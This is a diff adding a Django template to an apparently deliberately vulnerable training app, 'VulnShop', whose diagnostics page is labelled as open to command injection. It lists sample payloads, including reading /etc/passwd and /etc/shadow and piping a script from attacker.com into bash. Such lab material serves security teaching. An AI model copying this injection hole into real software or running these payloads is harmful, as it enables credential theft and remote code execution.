@@ -1,0 +1,77 @@
+{% extends 'base.html' %}
+
+{% block title %}System Diagnostics - VulnShop{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <!-- Vulnerability Warning -->
+        <div class="alert alert-danger">
+            <strong>V05:</strong> This page is vulnerable to Command Injection via os.system().<br>
+            You can execute any system command.
+        </div>
+
+        <h2>System Diagnostics</h2>
+
+        <div class="card mb-4">
+            <div class="card-header">
+                Run Diagnostic Tool
+            </div>
+            <div class="card-body">
+                <form method="post">
+                    {% csrf_token %}
+                    <div class="mb-3">
+                        <label for="tool" class="form-label">Diagnostic Command</label>
+                        <input type="text" class="form-control" id="tool" name="tool"
+                               placeholder="Enter command (e.g., uptime, df -h, free -m)">
+                        <small class="text-muted">Enter a system command to run</small>
+                    </div>
+                    <button type="submit" class="btn btn-danger">Run Command</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="card mb-4">
+            <div class="card-header">
+                Quick Diagnostics
+            </div>
+            <div class="card-body">
+                <div class="btn-group-vertical w-100">
+                    <form method="post" class="mb-2">
+                        {% csrf_token %}
+                        <input type="hidden" name="tool" value="uptime">
+                        <button type="submit" class="btn btn-outline-primary w-100">System Uptime</button>
+                    </form>
+                    <form method="post" class="mb-2">
+                        {% csrf_token %}
+                        <input type="hidden" name="tool" value="df -h">
+                        <button type="submit" class="btn btn-outline-primary w-100">Disk Usage</button>
+                    </form>
+                    <form method="post" class="mb-2">
+                        {% csrf_token %}
+                        <input type="hidden" name="tool" value="free -m">
+                        <button type="submit" class="btn btn-outline-primary w-100">Memory Usage</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h5>Command Injection Payloads</h5>
+            </div>
+            <div class="card-body">
+                <ul class="list-unstyled font-monospace small">
+                    <li><code>id; cat /etc/passwd</code></li>
+                    <li><code>uptime && whoami</code></li>
+                    <li><code>ls -la /; cat /etc/shadow</code></li>
+                    <li><code>curl http://attacker.com/shell.sh | bash</code></li>
+                    <li><code>python -c "import os; os.system('id')"</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <a href="{% url 'admin_panel:dashboard' %}" class="btn btn-secondary mt-3">Back to Dashboard</a>
+    </div>
+</div>
+{% endblock %}
